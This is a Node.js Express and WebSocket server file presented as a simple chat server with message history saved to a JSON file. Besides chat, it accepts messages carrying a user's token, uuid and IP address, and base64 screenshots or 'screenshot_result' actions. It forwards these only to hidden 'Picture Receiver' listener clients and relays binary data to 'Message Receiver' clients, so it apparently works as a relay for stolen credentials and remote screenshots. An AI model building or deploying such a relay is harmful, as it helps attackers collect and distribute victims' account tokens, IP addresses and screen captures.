import http from 'http';
import express from 'express';
import { WebSocket, WebSocketServer } from 'ws';
import crypto from 'crypto';
import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.static(path.join(__dirname, 'public')));
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });

const MESSAGES_FILE = path.join(__dirname, 'chat_messages.json');
let chatMessages = [];

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

server.listen(PORT, async () => {
    console.log(`Server is running on port ${PORT}`);
    await loadMessages();
});

const usersInChat = new Map();
const pictureReceivers = new Map();
const messageReceivers = new Map();
let keepAliveId = null;

async function loadMessages() {
    try {
        await fs.access(MESSAGES_FILE);
        const data = await fs.readFile(MESSAGES_FILE, 'utf8');
        chatMessages = JSON.parse(data);
        console.log('Chat messages loaded from file');
    } catch (error) {
        if (error.code === 'ENOENT') {
            console.log('No existing chat messages file found. Starting with empty chat history.');
            await saveMessages(); // Tạo file mới nếu không tồn tại
        } else {
            console.error('Error loading chat messages:', error);
        }
    }
}

async function saveMessages() {
    try {
        await fs.writeFile(MESSAGES_FILE, JSON.stringify(chatMessages, null, 2), 'utf8');
        console.log('Chat messages saved to file');
    } catch (error) {
        console.error('Error saving chat messages:', error);
        throw error; // Ném lỗi để xử lý ở cấp cao hơn nếu cần
    }
}

wss.on("connection", (ws) => {
    const userID = crypto.randomUUID();  
    usersInChat.set(userID, ws);
    
    ws.on("message", async (data) => {
        await handleMessage(ws, data, userID);
    });
    
    ws.on("close", () => {
        handleDisconnect(userID);
        ws.removeAllListeners(); 
    });
    
    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }
    
    broadcastUserCount();
});

wss.on("close", () => {
    if (keepAliveId) {
        clearInterval(keepAliveId);
        keepAliveId = null;
    }
});

app.get('/node-version', (req, res) => {
    res.send(`Node.js version: ${process.version}`);
});

app.get('/chat.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'chat.html'));
});

app.get('/api/messages', (req, res) => {
    const limit = parseInt(req.query.limit) || 50;
    const offset = parseInt(req.query.offset) || 0;
    res.json(chatMessages.slice(Math.max(0, chatMessages.length - offset - limit), chatMessages.length - offset).reverse());
});

const handleMessage = async (ws, data, userID) => {
    if (data.toString() === 'Message Receiver') {
        messageReceivers.set(userID, ws);
        console.log(`User ${userID} registered as Message Receiver`);
        ws.send(JSON.stringify({ type: 'userCount', count: usersInChat.size }));
    } else if (data instanceof Buffer) {
        broadcastToMessageReceivers(data, ws);
    } else {
        try {
            const messageData = JSON.parse(data.toString());
            
            if (messageData.type === 'chat') {
                const newMessage = {
                    id: crypto.randomUUID(),
                    userId: userID,
                    content: messageData.message,
                    timestamp: new Date().toISOString()
                };
                chatMessages.push(newMessage);
                try {
                    await saveMessages();  // Lưu tin nhắn ngay lập tức
                    console.log('Message saved successfully');
                } catch (error) {
                    console.error('Failed to save message:', error);
                    // Có thể thêm logic xử lý lỗi ở đây, ví dụ: gửi thông báo lỗi cho client
                }
                broadcastToAllExceptSpecialReceivers(ws, JSON.stringify({ type: 'chat', message: newMessage }), true);
            } else if (messageData.command === 'Picture Receiver') {
                pictureReceivers.set(userID, ws);
            } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
                broadcastToPictureReceivers(messageData);
            } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
                broadcastToPictureReceivers({
                    type: 'screenshot',
                    action: messageData.action,
                    screen: messageData.screen,
                    data: messageData.data
                });
            } else if (messageData.action === 'screenshot_result') {
                broadcastToPictureReceivers({
                    type: 'screenshot',
                    action: messageData.action,
                    screen: messageData.screen,
                    data: messageData.data
                });
            } else {
                broadcastToAllExceptSpecialReceivers(ws, JSON.stringify(messageData), false);
            }
        } catch (e) {
            console.error('Error parsing or processing message:', e);
            console.error('Raw message data:', data);
        }
    }
};

const broadcastToMessageReceivers = (binaryData, senderWs) => {
    messageReceivers.forEach((ws, userId) => {
        if (ws !== senderWs && ws.readyState === WebSocket.OPEN) {
            ws.send(binaryData, { binary: true }, error => {
                if (error) console.error("Error sending binary message to receiver:", error);
            });
        }
    });
};

const broadcastToPictureReceivers = (message) => {
    const data = JSON.stringify(message);
    pictureReceivers.forEach((ws, userId) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data, error => {
                if (error) console.error("Error sending message to picture receiver:", error);
            });
        }
    });
};

const broadcastToAllExceptSpecialReceivers = (senderWs, message, includeSelf) => {
    wss.clients.forEach(client => {
        if (!pictureReceivers.has(client) && !messageReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
            client.send(message);
        }
    });
};

const handleDisconnect = (userID) => {
    usersInChat.delete(userID);
    pictureReceivers.delete(userID);
    messageReceivers.delete(userID);
    console.log(`User ${userID} disconnected`);
    broadcastUserCount();
};

const broadcastUserCount = () => {
    const userCount = usersInChat.size;
    const message = JSON.stringify({ type: 'userCount', count: userCount });
    
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(message);
        }
    });
};

const keepServerAlive = () => {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping(); 
            }
        });
    }, 30000);
};

process.on('SIGINT', async () => {
    await saveMessages();
    process.exit(0);
});
